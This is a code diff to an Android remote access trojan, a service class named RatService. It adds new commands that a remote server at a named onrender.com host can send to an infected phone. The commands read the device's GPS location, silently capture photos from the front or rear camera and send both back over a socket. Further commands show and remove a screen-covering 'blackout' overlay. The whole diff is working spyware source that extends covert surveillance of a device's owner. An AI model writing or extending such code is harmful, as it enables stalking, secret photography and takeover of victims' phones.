@@ -23,12 +23,36 @@ public class RatService extends Service {
     private static final String SERVER_URL = "https://pris-rat.onrender.com";
     private Socket socket;
     private String deviceId;
+    private LocationModule locationModule;
+    private CameraModule cameraModule;
 
     @Override
     public void onCreate() {
         super.onCreate();
         deviceId = getDeviceId();
         startForeground(1, buildNotification());
+
+        locationModule = new LocationModule(this, (lat, lon) -> {
+            try {
+                JSONObject resp = new JSONObject();
+                resp.put("id", deviceId);
+                resp.put("type", "location");
+                resp.put("lat", lat);
+                resp.put("lon", lon);
+                if (socket != null && socket.connected()) socket.emit("response", resp);
+            } catch (Exception ignored) {}
+        });
+
+        cameraModule = new CameraModule(this, base64 -> {
+            try {
+                JSONObject resp = new JSONObject();
+                resp.put("id", deviceId);
+                resp.put("type", "camera");
+                resp.put("image", base64);
+                if (socket != null && socket.connected()) socket.emit("response", resp);
+            } catch (Exception ignored) {}
+        });
+
         connectSocket();
     }
 
@@ -83,21 +107,21 @@ public class RatService extends Service {
     }
 
     private void handleCommand(String action, JSONObject cmd) {
-        Intent i = null;
         switch (action) {
-            case "screen":
-                i = new Intent(this, ScreenActivity.class);
+            case "location":
+                locationModule.getLocation();
                 break;
             case "camera":
-                i = new Intent(this, CameraActivity.class);
+                boolean front = cmd.optBoolean("front", false);
+                cameraModule.capturePhoto(front);
                 break;
             case "blackout":
-                i = new Intent(this, OverlayService.class);
+                Intent i = new Intent(this, OverlayService.class);
+                startService(i);
                 break;
-        }
-        if (i != null) {
-            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(i);
+            case "unblackout":
+                stopService(new Intent(this, OverlayService.class));
+                break;
         }
     }
 
